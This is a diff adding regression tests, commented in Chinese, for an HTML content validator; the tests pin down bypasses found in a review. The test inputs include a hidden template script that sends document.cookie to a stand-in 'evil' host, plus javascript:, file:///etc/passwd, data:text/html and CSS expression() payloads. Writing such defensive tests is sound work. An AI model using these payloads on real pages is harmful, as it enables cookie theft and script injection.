@@ -158,3 +158,57 @@ test('toggle 正文含非法块（h5）→ non-conform（正文走 validateBlock
   assert.equal(r.conform, false);
   assert.ok(rules(r).includes('block-tag'));
 });
+
+// ---- 本轮对抗加固回归门（review 复现的绕过，钉死具体危险输入）----
+
+test('P0 template 走私：表格里 <template> 藏 <script> → non-conform（原判 conform）', () => {
+  // querySelectorAll(*) 不下探 template.content + validateTable 不检 template 子 → 曾判 conform。fail-closed 直接拒 template。
+  const r = v('<table class="ws-table"><template><script>fetch("//evil/"+document.cookie)</' +
+    'script></template><tbody><tr><td>a</td></tr></tbody></table>');
+  assert.equal(r.conform, false);
+  assert.ok(rules(r).includes('template'), rules(r).join(','));
+});
+test('P0 template 在任何位置都被拒（body 顶层 / details 内）', () => {
+  assert.equal(v('<template><p>x</p></template>').conform, false);
+  assert.equal(v('<details><summary>t</summary><template>x</template></details>').conform, false);
+});
+
+test('P0 img/资源 src 危险 scheme → non-conform（不再只查 <a>）', () => {
+  for (const src of ['javascript:alert(1)', 'file:///etc/passwd', 'vbscript:x', 'blob:http://x/u',
+    'data:text/html,<script>x</' + 'script>', 'data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=']) {
+    const r = v('<p><img src="' + src + '"></p>');
+    assert.equal(r.conform, false, 'img src=' + src + ' 应非法');
+    assert.ok(rules(r).includes('unsafe-src'), src + ' → ' + rules(r).join(','));
+  }
+  assert.equal(v('<p><img srcset="file:///x 1x"></p>').conform, false); // srcset 同样查
+});
+test('合法媒体 data:image/png 与相对/https src 不误伤', () => {
+  assert.equal(v('<p><img src="data:image/png;base64,iVBORw0KGgo="></p>').conform, true);
+  assert.equal(v('<p><img src="pic.png"></p>').conform, true);
+  assert.equal(v('<p><img src="https://x.com/a.png"></p>').conform, true);
+});
+
+test('P1 行内 style 危险值 → non-conform（覆盖层劫持/外链/老式执行向量）', () => {
+  for (const st of ['position:fixed;inset:0;z-index:9', 'position:sticky;top:0',
+    'background-image:url(http://evil/x)', 'width:expression(alert(1))', '-moz-binding:url(x)', 'behavior:url(x)']) {
+    const r = v('<p><span style="' + st + '">x</span></p>');
+    assert.equal(r.conform, false, 'style=' + st + ' 应非法');
+    assert.ok(rules(r).includes('style-value'), st + ' → ' + rules(r).join(','));
+  }
+});
+test('合法行内 style（排版属性）不误伤', () => {
+  assert.equal(v('<p><span style="color:#c00;background-color:#ff0;font-weight:bold;text-decoration:underline">x</span></p>').conform, true);
+});
+
+test('P2 顶层裸文本 → non-conform（rule top-text，须包在块里）', () => {
+  const r = v('Hello world<p>x</p>');
+  assert.equal(r.conform, false);
+  assert.ok(rules(r).includes('top-text'));
+  assert.equal(v('<p>a</p>\n  <p>b</p>').conform, true); // 块之间的空白文本节点（缩进/换行）不算
+});
+
+test('P2 <a href=blob:> 也被拦（同类 scheme 遗漏）', () => {
+  const r = v('<p><a href="blob:http://x/uuid">z</a></p>');
+  assert.equal(r.conform, false);
+  assert.ok(rules(r).includes('unsafe-href'));
+});
